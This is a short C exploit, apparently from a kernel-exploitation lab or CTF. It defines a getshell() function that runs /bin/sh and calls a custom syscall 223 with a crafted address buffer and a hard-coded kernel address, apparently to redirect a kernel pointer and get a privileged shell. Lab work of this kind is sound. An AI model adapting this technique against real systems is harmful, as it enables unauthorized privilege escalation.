#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>

void getshell() {
  system("/bin/sh");
}

int main() {
  // char a[8387480];
  // char b[0];
  // char in[4] = "AAAA";
  char in[4] = {0x99, 0x84, 0x00, 0x00};
  // printf("0x%x\n", (uintptr_t) &getshell);
  // *(unsigned int*) in = (uintptr_t) &getshell;
  syscall(223, in, 0x8000e6c4);
  syscall(223, NULL, NULL);
}
